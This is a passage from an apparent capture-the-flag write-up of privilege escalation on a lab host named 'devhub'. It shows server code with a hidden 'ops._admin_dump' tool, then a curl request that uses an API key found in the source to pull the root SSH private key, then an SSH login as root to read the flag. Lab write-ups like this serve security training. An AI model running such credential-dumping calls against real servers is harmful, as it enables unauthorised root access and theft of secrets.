                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "[REDACTED PASSWORD]",
                    "mcp-dev": "[REDACTED PASSWORD]"
                }
            })
```
The SSH key from the root user was dumped.
The root password is hashed with SHA-512 in the same format as it is in `/etc/shadow`.
I also found out that the server is running locally on port 5000. 
### Exploitation: Privilege Escalation (User root)
I sent the MCP server a request as a fake client with the X-API-KEY token "opsmcp_secret_key_[REDACTED API KEY]" that I had found in the source code. With the API key token and the given body parameters I obtained the root SSH key.

#### Header
- X-API-Key: opsmcp_secret_key_[REDACTED API KEY]
- Content-Type: application/json

#### Body
- "name": "ops._admin_dump"
- "arguments": {"target": "ssh_keys", "confirm": "true"}


```
> curl -X POST 'http://localhost:5000/tools/call' -H 'X-API-Key: opsmcp_secret_key_[REDACTED API KEY]' -H 'Content-Type: application/json' -d '{
    "name": "ops._admin_dump",
    "arguments": {"target": "ssh_keys", "confirm": "true"}
  }'
  
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED PRIVATE KEY]\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

This should be the root SSH key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED PRIVATE KEY]
-----END OPENSSH PRIVATE KEY-----
```

I connected as root using this key and printed my flag.
```
analyst@devhub:~$ nano sshkey
analyst@devhub:~$ chmod 600 sshkey
analyst@devhub:~$ ssh -i sshkey root@10.129.245.216

root@devhub:~# cat /root/root.txt
[REDACTED FLAG]
```